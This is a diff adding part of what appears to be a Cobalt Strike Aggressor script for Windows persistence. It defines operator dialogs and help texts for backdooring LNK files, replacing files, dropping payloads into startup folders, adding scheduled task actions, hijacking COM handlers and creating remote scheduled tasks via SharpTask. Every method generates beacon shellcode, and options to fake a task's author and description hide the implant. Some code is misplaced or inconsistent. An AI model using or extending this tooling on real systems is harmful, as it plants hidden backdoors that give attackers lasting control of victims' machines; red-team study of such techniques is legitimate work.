+		if($2 eq "Help"){
+			&nonjunctionfolderhelp();
+			break;
+		}
+		&argbuilder($bid, $3, $ptype);
+		}, \$bid, \$3, \$ptype));
+	dialog_description($dialog, "Non-Elevated: Create a new junction folder. Make sure DLL arch matches OS arch");
+	drow_text($dialog, "dllpath", "Dll Path: ");
+	drow_text($dialog, "guid", "GUID: ");
+	drow_text($dialog, "droplocation", "Drop Location: ");
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_file($dialog, "customfile", "Custom File: ");
+	drow_file($dialog, "template", "Template: ");
+	drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup Persistence");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
+
+
+
+#################################################
+
+#   Misc
+
+#################################################
+sub addactionschtaskdialog{
+	local('$dialog %defaults $bid');
+	$bid = $1;
+	$ptype = "scheduledtaskaction";
+
+	%defaults["droplocation"]  = %persistdefaults["droplocation"];
+	%defaults["action"] = "";
+	%defaults["listener"] = %persistdefaults["listener"];
+	%defaults["customfile"] = %persistdefaults["customfile"];
+	%defaults["template"] = %persistdefaults["template"];
+	%defaults["taskname"] = "";
+	%defaults["command"] = "";
+	%defaults["actionid"] = "";
+	%defaults["folder"] = "";
+	%defaults["cleanup"] = "false";
+
+	$dialog = dialog("Misc: Add Scheduled Task Action", %defaults, lambda({
+		if($2 eq "Help"){
+			&miscaddschtaskactionhelp();
+			break;
+		}
+		&argbuilder($bid, $3, $ptype);
+		}, \$bid, \$3, \$ptype));
+	dialog_description($dialog, "Misc: Add Action to Existing Scheduled Task");
+	drow_text($dialog, "taskname", "TaskName: ");
+	drow_text($dialog, "command", "Command: ");
+	drow_text($dialog, "folder", "Task Folder: ");
+	drow_text($dialog, "actionid", "Action ID: ");
+	drow_text($dialog, "droplocation", "Drop Location: ");
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_file($dialog, "customfile", "Custom File: ");
+	drow_file($dialog, "template", "Template: ");
+	drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup Persistence");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
+
+sub replacefiledialog{
+	local('$dialog %defaults $bid');
+	$bid = $1;
+	$ptype = "replacefile";
+
+	%defaults["droplocation"]  = %persistdefaults["droplocation"];
+	%defaults["action"] = "";
+	%defaults["listener"] = %persistdefaults["listener"];
+	%defaults["customfile"] = %persistdefaults["customfile"];
+	%defaults["template"] = %persistdefaults["template"];
+	%defaults["cleanup"] = "false";
+
+	$dialog = dialog("Misc: Replace file", %defaults, lambda({
+		if($2 eq "Help"){
+			&miscreplacefilehelp();
+			break;
+		}
+		&replacefile($bid, $3, $ptype);
+		}, \$bid, \$3, \$ptype));
+	dialog_description($dialog, "Misc: Replaces file on disk with selected file");
+	drow_text($dialog, "droplocation", "File Path: ");
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_file($dialog, "customfile", "Custom File: ");
+	drow_file($dialog, "template", "Template: ");
+	drow_combobox($dialog, "action", "Action: ", @("Download and remove", "Append .bak to name", "Append random characters to name"));
+	drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup Persistence");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
+
+sub startupfolderdialog{
+	local('$dialog %defaults $bid');
+	$bid = $1;
+	$ptype = "startupfolder";
+
+	%defaults["filename"] = "";
+	%defaults["startuppath"]  = "%APPDATA%";
+	%defaults["template"] = %persistdefaults["template"];
+	%defaults["customfile"] = %persistdefaults["customfile"];
+	%defaults["listener"] = %persistdefaults["listener"];
+	
+	$dialog = dialog("Misc: Startup Folder", %defaults, lambda({
+		if($2 eq "Help"){
+			&miscstartupfolderhelp();
+			break;
+		}
+		&startupdir($bid, $3, $ptype);
+		}, \$bid, \$3, \$ptype));
+	dialog_description($dialog, "Misc: Startup Folder either %PROGRAMDATA% for all users or %APPDATA% for current user");
+	drow_text($dialog, "filename", "Filename: ");
+	drow_combobox($dialog, "startuppath", "Startup Directory: ", @("%APPDATA%", "%PROGRAMDATA%"));
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_file($dialog, "customfile", "Custom File: ");
+	drow_file($dialog, "template", "Template File: ");
+	drow_checkbox($dialog, "cleanup", "Cleanup: ", "Cleanup Persistence");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
+
+sub newlnkdialog{
+	local('$dialog %defaults $bid');
+	$bid = $1;
+	$ptype = "newlnk";
+
+	%defaults["droplocation"] = %persistdefaults["droplocation"];
+	%defaults["command"] = %persistdefaults["command"];
+	%defaults["customfile"] = %persistdefaults["customfile"];
+	%defaults["template"] = %persistdefaults["template"];
+	%defaults["listener"] = %persistdefaults["listener"];
+	
+	$dialog = dialog("Misc: New LNK file", %defaults, lambda({
+		if($2 eq "Help"){
+			&miscnewlnkhelp();
+			break;
+		}
+		&argbuilder($bid, $3, $ptype);
+		}, \$bid, \$3, \$ptype));
+	dialog_description($dialog, "Misc: New LNK file");
+	drow_text($dialog, "filepath", "Lnk Path: ");
+	drow_text($dialog, "lnkname", "Lnk Name: ");
+	drow_text($dialog, "lnktarget", "Command: ");
+	drow_text($dialog, "lnkicon", "Lnk Icon: ");
+	drow_text($dialog, "droplocation", "Drop Location: ");
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_file($dialog, "customfile", "Custom File: ");
+	drow_file($dialog, "template", "Template File: ");
+	drow_checkbox($dialog, "cleanup", "Cleanup: ", "Cleanup Persistence");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
+
+sub backdoorlnkdialog{
+	local('$dialog %defaults $bid');
+	$bid = $1;
+	$ptype = "backdoorlnk";
+
+	%defaults["lnkpath"]  = %persistdefaults["lnkpath"];
+	%defaults["command"] = %persistdefaults["regcommand"];
+	%defaults["template"] = %persistdefaults["template"];
+	%defaults["customfile"] = %persistdefaults["customfile"];
+	%defaults["listener"] = %persistdefaults["listener"];
+	%defaults["droplocation"] = %persistdefaults["droplocation"];
+
+	$dialog = dialog("Misc: Backdoor LNK file", %defaults, lambda({
+		if($2 eq "Help"){
+			&miscbackdoorlnkhelp();
+			break;
+		}
+		&argbuilder($bid, $3, $ptype);
+		}, \$bid, \$3, \$ptype));
+	dialog_description($dialog, "Misc: Backdoor LNK file");
+	drow_text($dialog, "lnkpath", "Lnk Path: ");
+	drow_text($dialog, "command", "Command: ");
+	drow_text($dialog, "droplocation", "Drop Location: ");
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_file($dialog, "customfile", "Custom File: ");
+	drow_file($dialog, "template", "Template File: ");
+	drow_checkbox($dialog, "cleanup", "Cleanup: ", "Cleanup Persistence");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
+
+
+
+#################################################
+
+#   Setup/Update Default
+
+#################################################
+
+sub eleregistryhelp{
+	show_message("
+	Method:
+	    Elevated: Registry Key
+
+	Description:
+	    Creates a new registry key at specified location
+
+	Options:
+	    Key Name: Value name
+	    Command: Command to be ran when registry is used
+	    Drop Location: Location where to write a payload to (Optional)
+	    Listener: Listener to generate shellcode for (Optional)
+	    Custom File: Pre-created file to use instead of template (Optional)
+	    Template: Template to use with generated shellcode instead of custom file (Optional)
+	    Registry Key: Location where registry key will be created
+	    Cleanup: Removes created key
+
+	Cleanup Requirements:
+	    Cleanup requires the key name and registry key (location)");
+}
+
+sub eleuserinitregistryhelp{
+	show_message("
+	Method:
+	    Elevated: UserInit Registry Key
+
+	Description:
+	    Updates the user init registry key to also run a binary
+
+	Options:
+	    Command: Binary to be ran when registry is used
+	    Drop Location: Location where to write a payload to (Optional)
+	    Listener: Listener to generate shellcode for (Optional)
+	    Custom File: Pre-created file to use instead of template (Optional)
+	    Template: Template to use with generated shellcode instead of custom file (Optional)
+	    Registry Key: Location where registry key will be created
+	    Cleanup: Set key back to default value
+
+	Cleanup Requirements:
+	    No requirements");
+}
+
+sub elescheduledtaskhelp{
+	show_message("
+	Method:
+	    Elevated: Scheduled Task
+
+	Description:
+	    Creates a new scheduled task
+
+	Options:
+	    Task Name: Scheduled task name
+	    Command: Command to be ran when task triggers
+	    Run As: User to run task as
+	    Logon As: If trigger type if logon, specifies the logon of what user (Optional)
+	    Trigger Type: The type of scheduled task
+	    Author: Fake author of task (Optional)
+	    Description: Fake description of task (Optional)
+	    Repetition: If hourly trigger type, how many hours between trigger (Optional)
+	    At Time: What time for stard boundary/when to trigger (Optional)
+	    Drop Location: Location where to write a payload to (Optional)
+	    Listener: Listener to generate shellcode for (Optional)
+	    Custom File: Pre-created file to use instead of template (Optional)
+	    Template: Template to use with generated shellcode instead of custom file (Optional)
+	    Cleanup: Removes scheduled task
+
+	Cleanup Requirements:
+	    Cleanup requires the task name");
+}
+
+sub eleservicehelp{
+	show_message("
+	Method:
+	    Elevated: Service
+
+	Description:
+	    Creates a new service
+
+	Options:
+	    Service Name: Service name
+	    Command: Command to be ran when service is started
+	    Drop Location: Location where to write a payload to (Optional)
+	    Listener: Listener to generate shellcode for (Optional)
+	    Custom File: Pre-created file to use instead of template (Optional)
+	    Template: Template to use with generated shellcode instead of custom file (Optional)
+	    Cleanup: Removes created service
+
+	Cleanup Requirements:
+	    Cleanup requires the service name");
+}
+
+sub elewmieventsubhelp{
+	show_message("
+	Method:
+	    Elevated: WMI Event Subscription
+
+	Description:
+	    Creates a new WMI Event Subscription
+
+	Options:
+	    Event Name: Event subscription name
+	    Command: Command to be ran when service is started
+	    At Time: Either 'startup' or a time to trigger (ex: '10:30')
+	    Drop Location: Location where to write a payload to (Optional)
+	    Listener: Listener to generate shellcode for (Optional)
+	    Custom File: Pre-created file to use instead of template (Optional)
+	    Template: Template to use with generated shellcode instead of custom file (Optional)
+	    Cleanup: Removes created service
+
+	Cleanup Requirements:
+	    Cleanup requires the event subscription name");
+}
+
+sub nonregistryhelp{
+	show_message("
+	Method:
+	    Non-Elevated: Registry Key
+
+	Description:
+	    Creates a new registry key at specified location
+
+	Options:
+	    Key Name: Value name
+	    Command: Command to be ran when registry is used
+	    Drop Location: Location where to write a payload to (Optional)
+	    Listener: Listener to generate shellcode for (Optional)
+	    Custom File: Pre-created file to use instead of template (Optional)
+	    Template: Template to use with generated shellcode instead of custom file (Optional)
+	    Registry Key: Location where registry key will be created
+	    Cleanup: Removes created key
+
+	Cleanup Requirements:
+	    Cleanup requires the key name and registry key (location)");
+}
+
+sub nonregistryuserinitmprlogonhelp{
+	show_message("
+	Method:
+	    Non-Elevated: UserInitmMprLogonScript Registry Key
+
+	Description:
+	    Updates UserInitmMprLogonScript Registry Key
+
+	Options:
+	    Command: Command to be ran when key is used
+	    Drop Location: Location where to write a payload to (Optional)
+	    Listener: Listener to generate shellcode for (Optional)
+	    Custom File: Pre-created file to use instead of template (Optional)
+	    Template: Template to use with generated shellcode instead of custom file (Optional)
+	    Cleanup: Removes registry key
+
+	Cleanup Requirements:
+	    No requirements");
+}
+
+sub nonschtskcomhijackhelp{
+	show_message("
+	Method:
+	    Non-Elevated: Scheduled Task COM Handler Hijack
+
+	Description:
+	    Creates a registry key at HKCU\\Software\\Classes\\CLSID\\<CLSID>\\InprocServer32 that points to a DLL
+
+	Options:
+	    ClassID: The CLSID that corresponds to the task's COM Handler CLSID to be hijacked
+	    DLL Path: The path to set the registry value to of DLL to be loaded
+	    Drop Location: Location where to write a payload to (Optional)
+	    Listener: Listener to generate shellcode for (Optional)
+	    Custom File: Pre-created file to use instead of template (Optional)
+	    Template: Template to use with generated shellcode instead of custom file (Optional)
+	    Cleanup: Removes created registry key
+
+	Cleanup Requirements:
+	    Cleanup requires the CLSID");
+
+		drow_text($dialog, "clsid", "ClassID: ");
+	drow_text($dialog, "dllpath", "DLL Path: ");
+	drow_text($dialog, "droplocation", "Drop Location: ");
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_file($dialog, "customfile", "Custom File: ");
+	drow_file($dialog, "template", "Template: ");
+	drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup Persistence");
+}
+
+sub nonjunctionfolderhelp{
+	show_message("
+	Method:
+	    Non-Elevated: Junction Folder
+
+	Description:
+	    Creates folder in start menu directory that points to a registry key in HKCU\\Software\\Classes\\CLSID\\<GUID>
+
+	Options:
+	    ClassID: CLSID that was generated at installation, only used in cleanup (Optional)
+	    DLL Path: DLL location of where the registry value will point to
+	    Drop Location: Location where to write a payload to (Optional)
+	    Listener: Listener to generate shellcode for (Optional)
+	    Custom File: Pre-created file to use instead of template (Optional)
+	    Template: Template to use with generated shellcode instead of custom file (Optional)
+	    Cleanup: Removes created registry key and folder
+
+	Cleanup Requirements:
+	    Cleanup requires the CLSID");
+}
+
+sub miscaddschtaskactionhelp{
+	show_message("
+	Method:
+	    Misc: Add Scheduled Task Action
+
+	Description:
+	    Adds an action to an existing scheduled task
+
+	Options:
+	    Task Name: Scheduled Task name
+	    Command: Command to be ran when service is started
+	    Task Folder: Folder where task is located (ex: \\Microsoft\\Windows\\Ras)
+	    Drop Location: Location where to write a payload to (Optional)
+	    Listener: Listener to generate shellcode for (Optional)
+	    Custom File: Pre-created file to use instead of template (Optional)
+	    Template: Template to use with generated shellcode instead of custom file (Optional)
+	    Cleanup: Removes added actions
+
+	Cleanup Requirements:
+	    Cleanup requires task name, task folder, and original action's command");
+}
+
+sub miscreplacefilehelp{
+	show_message("
+	Method:
+	    Misc: Replace File
+
+	Description:
+	    Replaces a file on disk
+
+	Options:
+	    File Path: Location where to write a payload to and overwriting file is
+	    Listener: Listener to generate shellcode for (Optional)
+	    Custom File: Pre-created file to use instead of template (Optional)
+	    Template: Template to use with generated shellcode instead of custom file (Optional)
+	    Action: What to do with the file being over written
+	    Cleanup: Removes overwritten file and sets original file back, if action is download and remove, select as custom file
+
+	Cleanup Requirements:
+	    Cleanup requires the file path and used action");
+}
+
+sub miscstartupfolderhelp{
+	show_message("
+	Method:
+	    Misc: Startup Folder
+
+	Description:
+	    Writes a file to the starup directory
+
+	Options:
+	    File Name: Name of file on disk
+	    Startup Directory: Which directory to write the file to
+	    Listener: Listener to generate shellcode for (Optional)
+	    Custom File: Pre-created file to use instead of template (Optional)
+	    Template: Template to use with generated shellcode instead of custom file (Optional)
+	    Cleanup: Removes written file
+
+	Cleanup Requirements:
+	    Cleanup requires the file name and startup directory");
+}
+
+sub miscnewlnkhelp{
+	show_message("
+	Method:
+	    Misc: New Lnk
+
+	Description:
+	    Creates a new Lnk file on target
+
+	Options:
+	    Lnk Path: Location where Lnk will be created at
+	    Lnk Name: Name of Lnk
+	    Command: What the Lnk will run when executed
+	    Lnk Icon: What Icon the Lnk will have (full Windows path)
+	    Drop Location: Location where to write a payload to (Optional)
+	    Listener: Listener to generate shellcode for (Optional)
+	    Custom File: Pre-created file to use instead of template (Optional)
+	    Template: Template to use with generated shellcode instead of custom file (Optional)
+	    Cleanup: Removes created Lnk
+
+	Cleanup Requirements:
+	    Cleanup requires the Lnk name and Lnk path");
+}
+
+sub miscbackdoorlnkhelp{
+	show_message("
+	Method:
+	    Misc: BackDoor LNK File
+
+	Description:
+	    Modifies the target field of an existing LNK
+
+	Options:
+	    Lnk Path: Location where Lnk exists
+	    Command: Command to be ran when lnk is executed
+	    Drop Location: Location where to write a payload to (Optional)
+	    Listener: Listener to generate shellcode for (Optional)
+	    Custom File: Pre-created file to use instead of template (Optional)
+	    Template: Template to use with generated shellcode instead of custom file (Optional)
+	    Cleanup: Set Lnk's target back to original value
+
+	Cleanup Requirements:
+	    Cleanup requires the Lnk path and command field to be the original command");
+}
+
+#################################################
+
+#   SharpTask
+
+#################################################
+
+sub sharptask{
+ # beacon ID
+    $bid = $1;
+    
+ # command arugement variable  
+    $cmdargs = "";
+  
+ # Pop Dialog Box and control flow
+    $dialog = dialog("SharpTask: Add A Scheduled Task", %(execmethod => "Execute-Assembly"), lambda({
+ 
+ # manipulate the first argument depending on the executables command line switch statements
+ # manipulate the second argument depending on the expected input format  
+        foreach $key => $value ($3){
+            if ($value ne "" && $value ne "false" && $value ne "true" && $key ne "execmethod"){
+                $cmdargs .= $key;
+                $cmdargs .= ' ';
+                $cmdargs .= $value.' ';
+                $cmdargs .= ' ';
+            }
+
+        }
+ # btask just displays message in beacon window
+ # execute assembly it is important to notate the use of periods for concatenating the ptt switch      
+       if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Executing Pass The Ticket via Execute-Assembly');
+            bexecute_assembly($bid, script_resource('/exe/SharpTask.exe'), '--AddTask'.$cmdargs.''."");
+        }
+      
+    }));
+    
+ # Dialog box contents and text boxes mapped to command line argument keys   
+    dialog_description($dialog, "Enter The Following Information To Create A Scheduled Task On A Remote Machine:");
+    drow_text($dialog, "",  "Computer");
+    drow_text($dialog, "",  "Time");
+    drow_text($dialog, "",  "Folder");
+    drow_text($dialog, "",  "Task Name");
+    drow_text($dialog, "",  "Task Description");
+    drow_text($dialog, "",  "Path To Executable");
+    dbutton_action($dialog, "Run");
+	dialog_show($dialog);
+}
+
+
